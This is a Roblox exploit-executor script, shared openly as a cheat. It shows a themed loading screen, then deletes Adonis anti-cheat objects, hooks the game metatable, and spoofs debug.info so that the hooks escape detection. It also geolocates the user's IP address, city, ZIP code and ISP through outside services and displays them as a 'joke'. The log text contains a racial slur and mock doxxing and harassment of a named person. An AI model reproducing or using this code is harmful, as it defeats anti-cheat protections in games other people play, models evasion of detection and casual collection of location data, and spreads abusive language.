--!nocheck

-- listen here gng, ill leave u w the open src so u can have fun skidding
-- have funn

-- IGNORE COMMENTS
-- oh i used ai for this but script is written by hand itself

do
    local plrs = game:GetService("Players")
    local rns = game:GetService("RunService")
    local tws = game:GetService("TweenService")
    local sgc = game:GetService("StarterGui")
    local hs = game:GetService("HttpService")
    local ss = game:GetService("SoundService")

    local lplr = plrs.LocalPlayer
    if not lplr then return end
    local pg = lplr:WaitForChild("PlayerGui")

    local dur = 18
    if rns:IsStudio() then dur = 6 end

    local cbg = Color3.fromRGB(0, 0, 0)
    local cwht = Color3.fromRGB(255, 255, 255)

    local closing = false

    local req = rawget(_G, "request") or rawget(_G, "http_request")
    local syn = rawget(_G, "syn")
    local fluxus = rawget(_G, "fluxus")

    local exec = "Unknown"
    pcall(function()
        local name = identifyexecutor()
        if name then exec = tostring(name) end
    end)

    local uip = "Unknown"
    local uict = "Unknown"
    local uicz = "Unknown"
    local uisp = "Unknown"

    -- let's find out exactly where you live, you know, for legal reasons? (OK PAID SCRIPTBLOXERS/SCRIPTBLOXERS THIS IS JOKE, WE DONT LOG U THIS WAS ADDED 4 FUN)
    local function getip()
        local ip4 = nil
        local s1, r1 = pcall(function() return game:HttpGet("https://ipv4.icanhazip.com") end)
        if s1 and r1 then
            ip4 = string.gsub(r1, "%s+", "")
        end

        if ip4 then
            uip = ip4
            local g1, gr1 = pcall(function() return game:HttpGet("http://ip-api.com/json/" .. ip4 .. "?fields=status,message,country,city,zip,isp,query") end)
            if g1 and gr1 then
                local d1, dd1 = pcall(function() return hs:JSONDecode(gr1) end)
                if d1 and type(dd1) == "table" and dd1.status == "success" then
                    uict = dd1.country or "Unknown"
                    uicz = (dd1.city or "Unknown") .. " / " .. (dd1.zip or "Unknown")
                    uisp = dd1.isp or "Unknown"
                    return nil
                end
            end

            local g2, gr2 = pcall(function() return game:HttpGet("https://ipwho.is/" .. ip4) end)
            if g2 and gr2 then
                local d2, dd2 = pcall(function() return hs:JSONDecode(gr2) end)
                if d2 and type(dd2) == "table" and dd2.success then
                    uict = dd2.country or "Unknown"
                    uicz = (dd2.city or "Unknown") .. " / " .. (dd2.postal or "Unknown")
                    uisp = (dd2.connection and dd2.connection.isp) or "Unknown"
                    return nil
                end
            end
        else
            local a1, ar1 = pcall(function() return game:HttpGet("http://ip-api.com/json/?fields=status,message,country,city,zip,isp,query") end)
            if a1 and ar1 then
                local d3, dd3 = pcall(function() return hs:JSONDecode(ar1) end)
                if d3 and type(dd3) == "table" and dd3.status == "success" then
                    uip = dd3.query or "Unknown"
                    uict = dd3.country or "Unknown"
                    uicz = (dd3.city or "Unknown") .. " / " .. (dd3.zip or "Unknown")
                    uisp = dd3.isp or "Unknown"
                end
            end
        end
        return nil
    end
    getip()

    local function mk(cls, par, nm, props)
        local ins = Instance.new(cls)
        ins.Name = nm
        for k, v in pairs(props or {}) do
            ins[k] = v
        end
        ins.Parent = par
        return ins
    end

    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
    pcall(function() sgc:SetCore("TopbarEnabled", false) end)

    local function gethide()
        local ok, hui = pcall(function() return gethui and gethui() or nil end)
        if ok and hui then return hui end
        ok, hui = pcall(function() return get_hidden_gui and get_hidden_gui() or nil end)
        if ok and hui then return hui end
        return pg
    end

    local cont = gethide()
    local oldg = cont:FindFirstChild("BootScreen") or pg:FindFirstChild("BootScreen")
    if oldg then oldg:Destroy() end

    local gui = mk("ScreenGui", cont, "BootScreen", {
        ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 10000, ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    })
    pcall(function() gui.ScreenInsets = Enum.ScreenInsets.None end)

    local url = "https://raw.githubusercontent.com/UrexampleGD/nil.INCIDENT-X-Spread/main/cornandbeans%20-%20The%20Traveller.mp3"
    local fld = "WebToRobloxPlayer"
    local fname = fld .. "/cornandbeans.mp3"
    local tvol = 2
    local ftime = 1.6
    local loop = true
    local pspeed = 1
    local tpos = 0

    if type(makefolder) == "function" and type(isfolder) == "function" then
        if not isfolder(fld) then pcall(makefolder, fld) end
    end

    local function dl()
        local body
        if type(req) == "function" then
            local ok, res = pcall(req, { Url = url, Method = "GET" })
            if ok and res and res.Body then body = res.Body end
        end
        if not body and syn and type(syn.request) == "function" then
            local ok, res = pcall(syn.request, { Url = url, Method = "GET" })
            if ok and res and res.Body then body = res.Body end
        end
        if not body and fluxus and type(fluxus.request) == "function" then
            local ok, res = pcall(fluxus.request, { Url = url, Method = "GET" })
            if ok and res and res.Body then body = res.Body end
        end
        if not body then
            local ok, res = pcall(function() return game:HttpGet(url, true) end)
            if ok then body = res end
        end
        return body
    end

    local function ensure()
        if type(isfile) == "function" then
            local ok, has = pcall(isfile, fname)
            if ok and has then return true end
        end
        local body = dl()
        if not body or #body < 1000 then return false end
        if type(writefile) ~= "function" then return false end
        return pcall(writefile, fname, body)
    end

    local msc
    local function setupmusic()
        if not ensure() then return end
        local content
        if type(getcustomasset) == "function" then
            local ok, res = pcall(getcustomasset, fname)
            if ok then content = res end
        end
        if not content then return end
        local old = ss:FindFirstChild("WebToRobloxPlayer")
        if old then old:Destroy() end
        local sg = ss:FindFirstChild("WebToRobloxPlayerGroup")
        if not sg then
            sg = Instance.new("SoundGroup")
            sg.Name = "WebToRobloxPlayerGroup"
            sg.Volume = 1
            sg.Parent = ss
        end
        local snd = Instance.new("Sound")
        snd.Name = "WebToRobloxPlayer"
        snd.SoundId = content
        snd.Volume = 0
        snd.Looped = loop
        snd.PlaybackSpeed = pspeed
        snd.SoundGroup = sg
        snd.Parent = ss
        msc = snd
        pcall(function() snd.TimePosition = tpos end)
        pcall(function() snd:Play() end)
        task.spawn(function()
            local steps = 60
            local intr = ftime / steps
            for i = 1, steps do
                if not snd.Parent then return end
                snd.Volume = tvol * (i / steps)
                task.wait(intr)
            end
            if snd.Parent then snd.Volume = tvol end
        end)
    end
    task.spawn(setupmusic)

    local muteconns = {}
    local function muteobj(obj)
        if obj:IsA("Sound") and obj ~= msc then
            if not msc or obj.SoundGroup ~= msc.SoundGroup then
                pcall(function() obj.Volume = 0; obj.Playing = false end)
            end
        end
    end
    for _, obj in ipairs(ss:GetDescendants()) do muteobj(obj) end
    table.insert(muteconns, ss.DescendantAdded:Connect(muteobj))
    for _, obj in ipairs(workspace:GetDescendants()) do muteobj(obj) end
    table.insert(muteconns, workspace.DescendantAdded:Connect(muteobj))

    local bkg = mk("TextButton", gui, "Bg", {
        Text = "", AutoButtonColor = false, BorderSizePixel = 0, Modal = true, BackgroundColor3 = cbg, Size = UDim2.fromScale(1, 1),
    })

    local scan = mk("Frame", bkg, "Scan", {
        BackgroundTransparency = 0.95, BorderSizePixel = 0, ZIndex = 2, BackgroundColor3 = cwht, Size = UDim2.new(1, 0, 0, 3),
    })
    local sg1 = Instance.new("UIGradient")
    sg1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5, 0.7), NumberSequenceKeypoint.new(1, 1)})
    sg1.Parent = scan

    local mc = mk("Frame", bkg, "MainContainer", {
        BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(760, 530), ZIndex = 3,
    })
    local uis = Instance.new("UIScale", mc)
    local function updscale()
        local vp = gui.AbsoluteSize
        if vp.X < 10 then return end
        uis.Scale = math.clamp(math.min(vp.X / 860, vp.Y / 660), 0.4, 1.2)
    end
    gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(updscale)
    updscale()

    local ttl = mk("TextLabel", mc, "Title", {
        BackgroundTransparency = 1, Text = "SPH.LOADER", TextScaled = true, Font = Enum.Font.GothamBlack,
        TextColor3 = cwht, Size = UDim2.new(1, 0, 0, 60), Position = UDim2.new(0, 0, 0, 0),
    })
    local tg1 = Instance.new("UIGradient")
    tg1.Color = ColorSequence.new(cwht)
    tg1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(1, 0.5)})
    tg1.Rotation = 90
    tg1.Parent = ttl
    mk("UIStroke", ttl, "Stroke", { Thickness = 4, Color = cbg })
    Instance.new("UIScale", ttl)

    local grd = mk("Frame", mc, "Grid", {
        BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 390), Position = UDim2.new(0, 0, 0, 75),
    })

    local function spawnbox(nm, title, pos, anc)
        local ob = mk("Frame", grd, nm, {
            BackgroundColor3 = cwht, BorderSizePixel = 0, Position = pos, AnchorPoint = anc,
            Size = UDim2.new(0.5, -10, 0, 0), ClipsDescendants = true, ZIndex = 3,
        })
        local bg1 = Instance.new("UIGradient")
        bg1.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, cwht), ColorSequenceKeypoint.new(0.3, Color3.fromRGB(180, 180, 180)), ColorSequenceKeypoint.new(1, cbg)
        }
        bg1.Rotation = 45
        bg1.Parent = ob
        task.spawn(function()
            while ob.Parent do
                local sr = bg1.Rotation
                local tw = tws:Create(bg1, TweenInfo.new(3, Enum.EasingStyle.Linear), {Rotation = sr + 360})
                tw:Play(); tw.Completed:Wait()
            end
        end)
        local box = mk("Frame", ob, "Inner", {
            BackgroundColor3 = cbg, BorderSizePixel = 0, Position = UDim2.new(0, 1, 0, 1),
            Size = UDim2.new(1, -2, 1, -2), ClipsDescendants = true, ZIndex = 4,
        })
        local head = mk("Frame", box, "Head", { BackgroundColor3 = cbg, Size = UDim2.new(1, 0, 0, 30), BorderSizePixel = 0, ZIndex = 6 })
        mk("Frame", head, "Line", {BackgroundColor3 = cwht, Size = UDim2.new(1,0,0,1), Position = UDim2.new(0,0,1,-1), ZIndex = 6})
        local dot = mk("Frame", head, "StatusDot", { BackgroundColor3 = cwht, Size = UDim2.new(0, 6, 0, 6), Position = UDim2.new(0, 12, 0.5, -3), ZIndex = 7, BorderSizePixel = 0 })
        task.spawn(function()
            while dot.Parent do
                tws:Create(dot, TweenInfo.new(0.6), {BackgroundTransparency = 0.8}):Play(); task.wait(0.6)
                tws:Create(dot, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play(); task.wait(0.6)
            end
        end)
        mk("TextLabel", head, "Text", {
            BackgroundTransparency = 1, Text = title, Font = Enum.Font.Code, TextColor3 = cwht,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left, Size = UDim2.new(1, -30, 1, 0), Position = UDim2.new(0, 24, 0, 0), ZIndex = 7, TextWrapped = true
        })
        local txt = mk("TextLabel", box, "Log", {
            BackgroundTransparency = 1, Text = "", TextSize = 13, RichText = true, Font = Enum.Font.Code,
            TextColor3 = cwht, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Bottom,
            Position = UDim2.new(0, 12, 0, 38), Size = UDim2.new(1, -24, 1, -48), Visible = false, ZIndex = 5, TextWrapped = true
        })
        local tg2 = Instance.new("UIGradient")
        tg2.Color = ColorSequence.new(cwht)
        tg2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.15, 0), NumberSequenceKeypoint.new(1, 0)})
        tg2.Rotation = 90
        tg2.Parent = txt
        local ti = TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
        local tw = tws:Create(ob, ti, {Size = UDim2.new(0.5, -10, 0.5, -10)})
        tw:Play(); tw.Completed:Wait()
        txt.Visible = true
        return ob, txt
    end

    local bb = mk("Frame", mc, "BarBox", {
        BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 30), Position = UDim2.new(0, 0, 1, -20),
    })
    local sts = mk("TextLabel", bb, "Status", {
        BackgroundTransparency = 1, Text = "Initializing...", TextScaled = true, Font = Enum.Font.Code,
        TextColor3 = cwht, TextXAlignment = Enum.TextXAlignment.Left, Size = UDim2.new(0.7, 0, 0, 16),
    })
    local pct = mk("TextLabel", bb, "Pct", {
        BackgroundTransparency = 1, Text = "0%", TextScaled = true, Font = Enum.Font.Code,
        TextColor3 = cwht, TextXAlignment = Enum.TextXAlignment.Right, AnchorPoint = Vector2.new(1, 0),
        Position = UDim2.fromScale(1, 0), Size = UDim2.new(0.3, 0, 0, 16),
    })
    local well = mk("Frame", bb, "Well", { BorderSizePixel = 0, BackgroundColor3 = cbg, Position = UDim2.fromOffset(0, 22), Size = UDim2.new(1, 0, 0, 10) })
    mk("UIStroke", well, "Stroke", { Color = cwht })
    local fll = mk("Frame", well, "Fill", { BackgroundColor3 = cwht, BorderSizePixel = 0, Size = UDim2.new(0, 0, 1, 0) })

    local function gentxt(lbl, lines, spam)
        task.spawn(function()
            for _, line in ipairs(lines) do
                if closing then return end
                for i = 1, #line do
                    if closing then return end
                    lbl.Text = lbl.Text .. line:sub(i, i)
                    task.wait(0.005)
                end
                lbl.Text = lbl.Text .. "\n"
                task.wait(0.1)
            end
            if not closing then spam() end
        end)
    end

    -- The absolute state of this boot sequence. It's beautiful.. ITS PEAK!
    local sq1 = {"[INFO] Slapping the server hamster...", "[INFO] Downloading more RAM (this time for real)", "[INFO] Asking the firewall to stop being a jerk", "[INFO] Injecting 3000 cats into the mainframe", "[WARN] Server admin is crying in the corner", "[INFO] Bribing Byfron with a happy meal", "[INFO] Deleting System32 (oops wrong button)", "[INFO] Spoofing IP to toaster", "[OK] Everything is on fire but its fine", "[INFO] Evading the FBI (again)", "[INFO] Petting the anti-cheat (it purrs)", "[OK] Ready to rumble"}
    local function sp1(log1)
        local idx = 1
        while log1.Parent and not closing do
            local line = sq1[idx]; idx = idx + 1; if idx > #sq1 then idx = 1 end
            log1.Text = log1.Text .. line .. " [OK]\n"
            if #log1.Text > 1200 then local s = log1.Text:find("\n"); if s then log1.Text = log1.Text:sub(s + 1) end end
            task.wait(0.4)
        end
    end

    local sq2 = {"MOV EAX, 0xDEADBEEF", "MOV EBX, 0xC0FFEE69", "0x7FF6: 48 8B 05 ?? ?? ?? ??", "0x8FF4: FF 25 ?? ?? ?? ??", "CALL lol_nothing_personal", "JMP back_to_afghanistan", "PUSH 0x1337", "POP gamer_moment", "MOV EDX, 0x69696969", "XOR EAX, EAX (for legal reasons)", "TEST ESP, ESP (lol)", "0x99AA: NOP NOP NOP NOP", "SYSCALL 'please work'", "CALL bypass_anticheat_v2", "JMP $$oh_well"}
    local function sp2(log2)
        task.spawn(function()
            local cur = {}
            local idx = 1
            for i = 1, 20 do table.insert(cur, sq2[i]) end
            log2.Text = table.concat(cur, "\n")
            while log2.Parent and not closing do
                local bin = sq2[idx]; idx = idx + 1; if idx > #sq2 then idx = 1 end
                table.insert(cur, bin)
                if #cur > 20 then table.remove(cur, 1) end
                log2.Text = table.concat(cur, "\n")
                task.wait(0.03)
            end
        end)
    end

    local sq3 = {"Hacking the mainframe", "Downloading the anti-cheat's soul", "Testing if the anticheat is even real", "Patching Byfron with duct tape", "Yelling 'goodbye' to Vrodie", "Bypassing gravity (for science)", "Teaching a fish to hack", "Asking nicely for admin (it failed)", "Spoofing IP to Nintendo64", "Deleting the concept of dying", "Petting the server admin (they liked it)", "Becoming the anticheat's nightmare", "Telling Vrodie 'no' repeatedly", "Grabbing the fire hydrant", "Rizzing up the firewall"}
    local sq3res = {"[OK]", "[SUCCESS]", "[FAILED]", "[WARN]"}
    local function sp3(log3)
        local idx = 1
        local ri = 1
        while log3.Parent and not closing do
            local act = sq3[idx]; idx = idx + 1; if idx > #sq3 then idx = 1 end
            local res = sq3res[ri]; ri = ri + 1; if ri > #sq3res then ri = 1 end
            local dots = string.rep(".", math.max(2, 28 - #act))
            log3.Text = log3.Text .. string.format("%s %s %s\n", act, dots, res)
            if #log3.Text > 1200 then local s = log3.Text:find("\n"); if s then log3.Text = log3.Text:sub(s + 1) end end
            task.wait(0.5)
        end
    end

    local sq4 = {"> Vrodie: currently at the gym, please hold", "> Asking Vrodie for permission... denied", "> Bypassing Vrodie's permission anyway", "> Vrodie: tries to ban us", "> Us: lol no", "> Vrodie: calls roblox support", "> Roblox support: we don't care", "> Vrodie: cries in Robux", "> Injecting 500 trojans into Vrodie's PC", "> Vrodie's PC is now a toaster", "> Selling Vrodie's data to the CIA", "> Vrodie: how do I uninstall this", "> Us: you don't", "> Terminating Vrodie.exe", "> Vrodie: just got deleted from existence", "> Uploading Vrodie's face to Doxbin (jk)", "> Pinging the FBI headquarters (lol)", "> Vrodie: pleads for mercy", "> Us: no", "> DONE! Vrodie has been humbled"}
    local function sp4(log4)
        local idx = 1
        while log4.Parent and not closing do
            local msg = sq4[idx]; idx = idx + 1; if idx > #sq4 then idx = 1 end
            log4.Text = log4.Text .. msg .. "\n"
            if #log4.Text > 1200 then local s = log4.Text:find("\n"); if s then log4.Text = log4.Text:sub(s + 1) end end
            task.wait(0.6)
        end
    end

    local bx1, bx2, bx3, bx4
    task.spawn(function()
        task.wait(0.5)
        local b1, l1 = spawnbox("Box1", "> SYSTEM_LOG", UDim2.new(0.5, -10, 0.5, -10), Vector2.new(1, 1))
        bx1 = b1
        gentxt(l1, {"[INFO] Boot sequence started", "[INFO] ntoskrnl.exe base: 0xFFFFF800...", "[INFO] Logging info..", "[INFO] Resolving imports...", "[INFO] Applying relocations...", "[INFO] Executor: " .. exec, "[INFO] USER IP: " .. uip, "COUNTRY: " .. uict, "CITY ZIP: " .. uicz, "ISP: " .. uisp, "[OK] Nigga got logged (jk Scriptblox users! we dont log you.. added this 4 fun!)"}, function() task.wait(1.5); sp1(l1) end)

        task.wait(2.0)
        local b2, l2 = spawnbox("Box2", "> DIR/LOG", UDim2.new(0.5, 10, 0.5, -10), Vector2.new(0, 1))
        bx2 = b2
        gentxt(l2, {"0x7FF6A8C30000", "0x7FF6A8C31000", "48 8B 05 ?? ?? ?? ??", "FF 25 ?? ?? ?? ??", "0x7FF6A8C32000"}, function() sp2(l2) end)

        task.wait(2.0)
        local b3, l3 = spawnbox("Box3", "> TESTING SERVER 4 HACK", UDim2.new(0.5, -10, 0.5, 10), Vector2.new(1, 0))
        bx3 = b3
        gentxt(l3, {"Hooking __namecall ........ [OK]", "Checking sUNC ............. [SUCCESS]", "Bypassing Byfron .......... [OK]", "Patching Integrity ........ [FAILED]", "Testing getrawmetatable ... [OK]"}, function() sp3(l3) end)

        task.wait(2.0)
        local b4, l4 = spawnbox("Box4", "> VRODIELOADER.EXE", UDim2.new(0.5, 10, 0.5, 10), Vector2.new(0, 0))
        bx4 = b4
        gentxt(l4, {"> Downloading more RAM...", "> Bypassing Vrodie's ego...", "> REVERSING GRAVITY", "> Pasting from GitHub..."}, function() sp4(l4) end)
    end)

    local stime = os.clock()
    local ddone = false

    rns.RenderStepped:Connect(function()
        if ddone or closing then return end
        local el = os.clock() - stime
        local pr = math.clamp(el / dur, 0, 1)

        scan.Position = UDim2.new(0, 0, el * 0.35 % 1.05, 0)
        fll.Size = UDim2.new(pr, 0, 1, 0)
        pct.Text = math.floor(pr * 100) .. "%"

        sts.Text = if pr < 0.25 then "freezing this game Anti Cheat"
            elseif pr < 0.5 then "filling em with some shit"
            elseif pr < 0.75 then "Crashing Adonis/Anti Cheat x2"
            elseif pr < 0.9 then "FINISH YAY"
            else "YESS YESS YESS WORK"

        if pr >= 1 then
            ddone = true
            closing = true
            task.wait(0.1)

            tws:Create(fll, TweenInfo.new(0.1), {Size = UDim2.new(1, 0, 1, 0)}):Play()
            pct.Text = "100%"
            sts.Text = "YESS YESS YESS WORK"
            task.wait(0.2)

            local fti = TweenInfo.new(0.3, Enum.EasingStyle.Linear)
            local cp = mk("Frame", mc, "CenterPoint", {
                BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.fromOffset(0, 0), ZIndex = 80,
            })
            local of = mk("Frame", cp, "OrbitFrame", {
                BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.fromOffset(0, 0), ZIndex = 90,
            })
            local ccs = {}

            local function morphel(el, tp, isd)
                if not el or not el.Parent then return end
                local cc = Instance.new("Frame")
                cc.BackgroundColor3 = cwht
                cc.Size = UDim2.fromOffset(30, 30)
                cc.AnchorPoint = Vector2.new(0.5, 0.5)
                cc.ZIndex = 95
                cc.Parent = of

                if isd then
                    cc.Position = UDim2.new(0, 0, 0, 0)
                    el:Destroy()
                else
                    local ap = el.AbsolutePosition
                    local as = el.AbsoluteSize
                    local mp = mc.AbsolutePosition
                    local ms = mc.AbsoluteSize
                    local cx = ap.X + as.X / 2
                    local cy = ap.Y + as.Y / 2
                    local rx = cx - mp.X - ms.X / 2
                    local ry = cy - mp.Y - ms.Y / 2
                    cc.Position = UDim2.new(0, rx, 0, ry)
                    tws:Create(el, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
                    for _, v in ipairs(el:GetDescendants()) do
                        if v:IsA("TextLabel") then tws:Create(v, TweenInfo.new(0.2), {TextTransparency = 1}):Play() end
                        if v:IsA("Frame") then tws:Create(v, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play() end
                        if v:IsA("UIStroke") then tws:Create(v, TweenInfo.new(0.2), {Transparency = 1}):Play() end
                    end
                    task.wait(0.2)
                    el.Visible = false
                end
                tws:Create(cc, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = tp}):Play()
                table.insert(ccs, cc)
                return nil
            end

            local r = 140
            local els = {bx1, bx2, bx3, bx4, ttl, bb}
            local items = {}
            for i = 1, 8 do
                local ang = (i - 1) * (math.pi * 2 / 8) - math.pi / 2
                local px = math.cos(ang) * r
                local py = math.sin(ang) * r
                local pos = UDim2.new(0, px, 0, py)
                if i <= #els then
                    table.insert(items, {el = els[i], pos = pos, isd = false})
                else
                    local dm = mk("Frame", mc, "DummyCircle", { BackgroundTransparency = 1, Size = UDim2.fromOffset(0, 0), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), ZIndex = 95 })
                    table.insert(items, {el = dm, pos = pos, isd = true})
                end
            end
            for _, itm in ipairs(items) do task.spawn(function() morphel(itm.el, itm.pos, itm.isd) end) end
            task.wait(0.8)

            local fg = mk("Frame", cp, "FedoraData", { BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.fromOffset(0, 0), Rotation = -180, ZIndex = 100 })
            mk("ImageLabel", fg, "Icon", { Image = "rbxassetid://132630565310055", BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ImageColor3 = cwht, ZIndex = 101 })
            local ftt = mk("TextLabel", fg, "Name", { Text = "SPH_SECRET (vow)", BackgroundTransparency = 1, TextSize = 16, Font = Enum.Font.GothamBold, TextColor3 = cwht, Position = UDim2.new(0, 0, 1, 8), Size = UDim2.new(1, 0, 0, 20), TextTransparency = 1, ZIndex = 101, TextWrapped = true })

            tws:Create(fg, TweenInfo.new(0.8, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), { Size = UDim2.fromOffset(120, 120), Rotation = 0 }):Play()
            tws:Create(ftt, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
            task.wait(0.5)

            local rt = tws:Create(of, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Rotation = 720})
            rt:Play(); rt.Completed:Wait()

            for _, c in ipairs(ccs) do
                if c and c.Parent then
                    tws:Create(c, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), { Position = UDim2.new(0, 0, 0, 0), Size = UDim2.fromOffset(0, 0) }):Play()
                end
            end
            task.wait(0.35)

            local ex = tws:Create(fg, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(250, 250)})
            ex:Play()

            local sw = mk("Frame", cp, "Shockwave", { BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.fromOffset(0, 0), ZIndex = 99 })
            local sws = Instance.new("UIStroke", sw); sws.Color = cwht; sws.Thickness = 6

            task.spawn(function()
                tws:Create(sw, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.fromOffset(650, 650) }):Play()
                tws:Create(sws, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Transparency = 1, Thickness = 0 }):Play()
                task.wait(0.5); sw:Destroy()
            end)

            for i = 1, 40 do
                local p = mk("Frame", cp, "P"..i, { BackgroundColor3 = cwht, Size = UDim2.fromOffset(10, 10), Position = UDim2.new(0.5, 0, 0.5, 0), AnchorPoint = Vector2.new(0.5, 0.5), ZIndex = 99 })
                local ang = (i - 1) * (math.pi * 2 / 40)
                local dist = 300
                local tx = math.cos(ang) * dist
                local ty = math.sin(ang) * dist
                task.spawn(function()
                    tws:Create(p, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0.5, tx, 0.5, ty), BackgroundTransparency = 1, Size = UDim2.fromOffset(0,0) }):Play()
                    task.wait(0.6); p:Destroy()
                end)
            end

            ex.Completed:Wait()
            tws:Create(fg, TweenInfo.new(0.2), {Size = UDim2.fromOffset(0,0)}):Play()
            tws:Create(ftt, TweenInfo.new(0.2), {TextTransparency = 1}):Play()

            if msc then
                tws:Create(msc, TweenInfo.new(2), {Volume = 0}):Play()
                task.delay(2, function() if msc then msc:Destroy() end end)
            end
            task.wait(0.3)

            local fl = mk("Frame", gui, "Flash", { BackgroundTransparency = 0.5, BorderSizePixel = 0, ZIndex = 50, BackgroundColor3 = cwht, Size = UDim2.fromScale(1, 1) })
            local ft = tws:Create(fl, fti, { BackgroundTransparency = 1 })
            ft:Play()
            ft.Completed:Wait()
            tws:Create(bkg, fti, { BackgroundTransparency = 1 }):Play()
            task.wait(0.1)

            task.spawn(function()
                for i = 1, 10 do
                    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
                    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
                    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.VoiceChat, true) end)
                    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
                    pcall(function() sgc:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
                    pcall(function() sgc:SetCore("TopbarEnabled", true) end)
                    task.wait(0.5)
                end
            end)

            for _, conn in ipairs(muteconns) do pcall(function() conn:Disconnect() end) end

            lplr:SetAttribute("BootScreenDone", true)
            gui:Destroy()
        end
    end)
end

local pl = game:GetService("Players").LocalPlayer
if not pl:GetAttribute("BootScreenDone") then
    repeat task.wait(0.1) until pl:GetAttribute("BootScreenDone") == true
end
task.wait(3)

if getgenv().sphcleanup then
    local o = getgenv().sphcleanup
    o.active = false
    for _, c in pairs(o.conns or {}) do pcall(function() c:Disconnect() end) end
    if o.fov then pcall(function() o.fov:Remove() end) end
    if o.hls then for _, h in pairs(o.hls) do pcall(function() h:Destroy() end) end end
    if o.gui then pcall(function() o.gui:Destroy() end) end
    if o.oldidx or o.oldnc or o.oldnind then
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        if o.oldidx then mt.__index = o.oldidx end
        if o.oldnc then mt.__namecall = o.oldnc end
        if o.oldnind then mt.__newindex = o.oldnind end
        setreadonly(mt, true)
    end
    if o.ch then
        for _, drawing in pairs(o.ch) do pcall(function() drawing:Remove() end) end
    end
    if o.playerControls then pcall(function() o.playerControls:Enable() end) end
end

getgenv().sphcleanup = { active = true, conns = {}, fov = nil, hls = {}, gui = nil, ch = {} }

if game and not game:IsLoaded() then repeat task.wait() until game:IsLoaded() end

local plrs = game:GetService("Players")
local rns = game:GetService("RunService")
local uin = game:GetService("UserInputService")
local rs = game:GetService("ReplicatedStorage")
local hs = game:GetService("HttpService")
local tws = game:GetService("TweenService")
local cs = game:GetService("CollectionService")
local lgt = game:GetService("Lighting")
local lplr = plrs.LocalPlayer
local cam = workspace.CurrentCamera
local pgui = lplr:WaitForChild("PlayerGui")

-- let the game know we mean business
pcall(function()
    local gc = require(rs:WaitForChild("SPH_Assets"):WaitForChild("GameConfig"))
    if gc then gc.thirdPersonFiring = true end
end)

local function addc(c) table.insert(getgenv().sphcleanup.conns, c) end

task.spawn(function()
    for _, s in pairs(game:GetChildren()) do
        pcall(function()
            for _, v in pairs(s:GetDescendants()) do
                if string.find(string.lower(v.Name), "adonis") then v:Destroy() end
            end
        end)
    end
    for _, t in ipairs({"Adonis", "AntiCheat", "Adonis_Loader", "Adonis_Client", "Adonis_Detected"}) do
        for _, v in pairs(cs:GetTagged(t)) do pcall(function() v:Destroy() end) end
    end
end)

local mt = getrawmetatable(game)
local oldidx = mt.__index
local oldnc = mt.__namecall
local oldnind = mt.__newindex
local newidx, newnc, newnind

getgenv().sphcleanup.oldidx = oldidx
getgenv().sphcleanup.oldnc = oldnc
getgenv().sphcleanup.oldnind = oldnind

local odinfo = debug.info
local function finfo(f, w)
    if f == newidx or f == newnc or f == newnind then
        if w == "s" then return "[C]" end
        if w == "l" then return -1 end
        if w == "n" then return "" end
        if w == "a" then return 0 end
        if w == "f" then return f end
        if w == "slnaf" then return "[C]", -1, "", 0, f end
        return "[C]", -1, "", 0, f
    end
    return odinfo(f, w)
end
hookfunction(debug.info, newcclosure(finfo))

local playerControls
pcall(function()
    local ps = lplr:FindFirstChild("PlayerScripts")
    if ps then
        local pm = ps:FindFirstChild("PlayerModule")
        if pm then
            local ok, mod = pcall(require, pm)
            if ok and mod and type(mod.GetControls) == "function" then
                playerControls = mod:GetControls()
            end
        end
    end
end)
